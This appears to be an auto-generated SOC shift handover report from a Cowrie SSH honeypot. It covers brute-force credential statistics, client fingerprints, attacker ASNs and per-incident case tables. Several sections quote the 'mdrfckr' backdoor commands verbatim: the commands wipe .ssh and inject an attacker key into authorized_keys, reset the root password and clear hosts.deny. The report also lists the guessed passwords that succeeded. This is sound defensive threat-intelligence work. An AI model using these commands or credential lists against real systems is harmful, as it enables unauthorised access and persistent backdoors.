# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-23 |
| **Generated At** | 2026-06-23T14:57:02Z |
| **Shift Time** | 14:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **145** |
| Confirmed Threats | **134** |
| False Positives Filtered | **11** (7.6%) |
| Unique Attacker IPs | **45** |
| Countries of Origin | **16** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **114** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **68** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **25** |
| Unique Passwords | **43** |
| Successful Auth Pairs | **23** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 13 |
| `dev` | 2 |
| `ovh` | 1 |
| `m` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 12 |
| `123456` | 2 |
| `654321` | 2 |
| `ovh` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 12 |
| `root` | `654321` | 2 |
| `ovh` | `ovh` | 1 |
| `root` | `m123456789` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `m123456789` | `103.181.142.22` | 2026-06-23T11:21:06 |
| `root` | `3245gs5662d34` | `103.181.142.22` | 2026-06-23T11:21:11 |
| `root` | `Welcome@2026` | `103.181.142.22` | 2026-06-23T11:21:32 |
| `root` | `QAZ123wsx456` | `103.181.142.22` | 2026-06-23T11:23:19 |
| `root` | `Lol12345` | `103.181.142.22` | 2026-06-23T11:23:43 |
| `root` | `jenkins` | `103.181.142.22` | 2026-06-23T11:24:05 |
| `root` | `Aa1234567890@` | `103.181.142.22` | 2026-06-23T11:24:54 |
| `root` | `Dd123123` | `103.181.142.22` | 2026-06-23T11:25:45 |
| `root` | `Ww112233` | `103.181.142.22` | 2026-06-23T11:28:44 |
| `root` | `Hl123456` | `103.181.142.22` | 2026-06-23T11:30:00 |
| `root` | `adminHW` | `36.32.156.177` | 2026-06-23T11:37:34 |
| `root` | `qweasd123.` | `154.116.254.157` | 2026-06-23T11:50:50 |
| `root` | `3245gs5662d34` | `154.116.254.157` | 2026-06-23T11:50:56 |
| `root` | `Aa@123456` | `39.97.255.191` | 2026-06-23T12:13:50 |
| `root` | `123qweasdzxc` | `82.201.143.184` | 2026-06-23T13:07:29 |
| `root` | `test12345678` | `103.154.158.70` | 2026-06-23T13:13:11 |
| `root` | `3245gs5662d34` | `103.154.158.70` | 2026-06-23T13:13:13 |
| `root` | `123abc,` | `211.46.188.16` | 2026-06-23T13:15:20 |
| `root` | `12345abc` | `212.115.54.84` | 2026-06-23T13:36:07 |
| `root` | `3245gs5662d34` | `212.115.54.84` | 2026-06-23T13:36:10 |
| `root` | `654321` | `82.19.12.103` | 2026-06-23T13:43:13 |
| `root` | `654321` | `188.166.179.34` | 2026-06-23T13:43:21 |
| `root` | `root555` | `60.249.251.88` | 2026-06-23T14:12:26 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **145** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 70 |
| OpenSSH | 6 |
| Go SSH scanner | 3 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 57 | 9 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 6 | 6 |
| `af8223ac9914...` | libssh-based | 4 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 57 | 9 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 6 | 6 | Mirai/variant |
| `af8223ac9914...` | libssh | 4 | 2 | libssh-based |
| `e54ef3ec27fe...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:A8W57IRdJ83r"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `82.201.143.184`, `211.46.188.16`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.181.142.22`, `154.116.254.157`, `103.154.158.70`, `212.115.54.84`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **45** |
| Unique ASNs | **31** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS0` |  | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (30)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-28d4d33e374d

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:21 |
| **Last Seen** | 2026-06-23 11:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:21:05` | `cowrie.session.connect` |
| `2026-06-23 11:21:05` | `cowrie.client.version` |
| `2026-06-23 11:21:05` | `cowrie.client.kex` |
| `2026-06-23 11:21:06` | `cowrie.login.success` |
| `2026-06-23 11:21:06` | `cowrie.session.params` |
| `2026-06-23 11:21:06` | `cowrie.command.input` |
| `2026-06-23 11:21:06` | `cowrie.command.failed` |
| `2026-06-23 11:21:07` | `cowrie.log.closed` |
| `2026-06-23 11:21:07` | `cowrie.session.params` |
| `2026-06-23 11:21:07` | `cowrie.command.input` |
| `2026-06-23 11:21:07` | `cowrie.session.file_download` |
| `2026-06-23 11:21:07` | `cowrie.log.closed` |
| `2026-06-23 11:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf46329cbd5e

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:21 |
| **Last Seen** | 2026-06-23 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:21:10` | `cowrie.session.connect` |
| `2026-06-23 11:21:10` | `cowrie.client.version` |
| `2026-06-23 11:21:10` | `cowrie.client.kex` |
| `2026-06-23 11:21:11` | `cowrie.login.success` |
| `2026-06-23 11:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff5aba0a74f

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:21 |
| **Last Seen** | 2026-06-23 11:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:21:31` | `cowrie.session.connect` |
| `2026-06-23 11:21:31` | `cowrie.client.version` |
| `2026-06-23 11:21:31` | `cowrie.client.kex` |
| `2026-06-23 11:21:32` | `cowrie.login.success` |
| `2026-06-23 11:21:33` | `cowrie.session.params` |
| `2026-06-23 11:21:33` | `cowrie.command.input` |
| `2026-06-23 11:21:33` | `cowrie.command.failed` |
| `2026-06-23 11:21:33` | `cowrie.log.closed` |
| `2026-06-23 11:21:33` | `cowrie.session.params` |
| `2026-06-23 11:21:33` | `cowrie.command.input` |
| `2026-06-23 11:21:33` | `cowrie.session.file_download` |
| `2026-06-23 11:21:33` | `cowrie.log.closed` |
| `2026-06-23 11:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02526e8c8459

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:21 |
| **Last Seen** | 2026-06-23 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:21:36` | `cowrie.session.connect` |
| `2026-06-23 11:21:36` | `cowrie.client.version` |
| `2026-06-23 11:21:36` | `cowrie.client.kex` |
| `2026-06-23 11:21:37` | `cowrie.login.success` |
| `2026-06-23 11:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c279cc9a30c9

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:23 |
| **Last Seen** | 2026-06-23 11:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:23:18` | `cowrie.session.connect` |
| `2026-06-23 11:23:18` | `cowrie.client.version` |
| `2026-06-23 11:23:19` | `cowrie.client.kex` |
| `2026-06-23 11:23:19` | `cowrie.login.success` |
| `2026-06-23 11:23:20` | `cowrie.session.params` |
| `2026-06-23 11:23:20` | `cowrie.command.input` |
| `2026-06-23 11:23:20` | `cowrie.command.failed` |
| `2026-06-23 11:23:20` | `cowrie.log.closed` |
| `2026-06-23 11:23:21` | `cowrie.session.params` |
| `2026-06-23 11:23:21` | `cowrie.command.input` |
| `2026-06-23 11:23:21` | `cowrie.session.file_download` |
| `2026-06-23 11:23:21` | `cowrie.log.closed` |
| `2026-06-23 11:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04821e654e04

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:23 |
| **Last Seen** | 2026-06-23 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:23:23` | `cowrie.session.connect` |
| `2026-06-23 11:23:23` | `cowrie.client.version` |
| `2026-06-23 11:23:23` | `cowrie.client.kex` |
| `2026-06-23 11:23:24` | `cowrie.login.success` |
| `2026-06-23 11:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c08df4aefc96

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:23 |
| **Last Seen** | 2026-06-23 11:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:23:42` | `cowrie.session.connect` |
| `2026-06-23 11:23:42` | `cowrie.client.version` |
| `2026-06-23 11:23:42` | `cowrie.client.kex` |
| `2026-06-23 11:23:43` | `cowrie.login.success` |
| `2026-06-23 11:23:44` | `cowrie.session.params` |
| `2026-06-23 11:23:44` | `cowrie.command.input` |
| `2026-06-23 11:23:44` | `cowrie.command.failed` |
| `2026-06-23 11:23:44` | `cowrie.log.closed` |
| `2026-06-23 11:23:44` | `cowrie.session.params` |
| `2026-06-23 11:23:44` | `cowrie.command.input` |
| `2026-06-23 11:23:44` | `cowrie.session.file_download` |
| `2026-06-23 11:23:44` | `cowrie.log.closed` |
| `2026-06-23 11:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ace79840d14

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:23 |
| **Last Seen** | 2026-06-23 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:23:47` | `cowrie.session.connect` |
| `2026-06-23 11:23:47` | `cowrie.client.version` |
| `2026-06-23 11:23:47` | `cowrie.client.kex` |
| `2026-06-23 11:23:48` | `cowrie.login.success` |
| `2026-06-23 11:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b6f26815ae

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:24 |
| **Last Seen** | 2026-06-23 11:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:24:04` | `cowrie.session.connect` |
| `2026-06-23 11:24:04` | `cowrie.client.version` |
| `2026-06-23 11:24:04` | `cowrie.client.kex` |
| `2026-06-23 11:24:05` | `cowrie.login.success` |
| `2026-06-23 11:24:05` | `cowrie.session.params` |
| `2026-06-23 11:24:05` | `cowrie.command.input` |
| `2026-06-23 11:24:05` | `cowrie.command.failed` |
| `2026-06-23 11:24:06` | `cowrie.log.closed` |
| `2026-06-23 11:24:06` | `cowrie.session.params` |
| `2026-06-23 11:24:06` | `cowrie.command.input` |
| `2026-06-23 11:24:06` | `cowrie.session.file_download` |
| `2026-06-23 11:24:06` | `cowrie.log.closed` |
| `2026-06-23 11:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fad2b984e459

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:24 |
| **Last Seen** | 2026-06-23 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:24:09` | `cowrie.session.connect` |
| `2026-06-23 11:24:09` | `cowrie.client.version` |
| `2026-06-23 11:24:09` | `cowrie.client.kex` |
| `2026-06-23 11:24:10` | `cowrie.login.success` |
| `2026-06-23 11:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f889f0f26523

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:24 |
| **Last Seen** | 2026-06-23 11:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:24:53` | `cowrie.session.connect` |
| `2026-06-23 11:24:53` | `cowrie.client.version` |
| `2026-06-23 11:24:53` | `cowrie.client.kex` |
| `2026-06-23 11:24:54` | `cowrie.login.success` |
| `2026-06-23 11:24:54` | `cowrie.session.params` |
| `2026-06-23 11:24:54` | `cowrie.command.input` |
| `2026-06-23 11:24:54` | `cowrie.command.failed` |
| `2026-06-23 11:24:54` | `cowrie.log.closed` |
| `2026-06-23 11:24:55` | `cowrie.session.params` |
| `2026-06-23 11:24:55` | `cowrie.command.input` |
| `2026-06-23 11:24:55` | `cowrie.session.file_download` |
| `2026-06-23 11:24:55` | `cowrie.log.closed` |
| `2026-06-23 11:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74c59709f49

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:24 |
| **Last Seen** | 2026-06-23 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:24:57` | `cowrie.session.connect` |
| `2026-06-23 11:24:57` | `cowrie.client.version` |
| `2026-06-23 11:24:58` | `cowrie.client.kex` |
| `2026-06-23 11:24:58` | `cowrie.login.success` |
| `2026-06-23 11:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
